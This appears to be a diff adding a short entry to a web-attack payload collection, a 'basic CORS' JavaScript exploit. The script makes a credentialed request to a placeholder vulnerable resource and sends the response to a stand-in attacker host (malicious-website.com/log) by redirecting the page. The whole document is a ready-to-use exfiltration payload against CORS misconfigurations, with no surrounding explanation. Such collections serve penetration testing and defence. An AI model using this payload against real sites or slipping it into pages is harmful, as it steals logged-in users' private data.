@@ -1,0 +1,12 @@
+#basic CORS JavaScript
+<script>
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','<$url/vulnerable_resource>',true);
+	req.withCredentials = true;
+	req.send();
+
+	function reqListener() {
+	   location='//malicious-website.com/log?key='+this.responseText;
+	};
+</script>
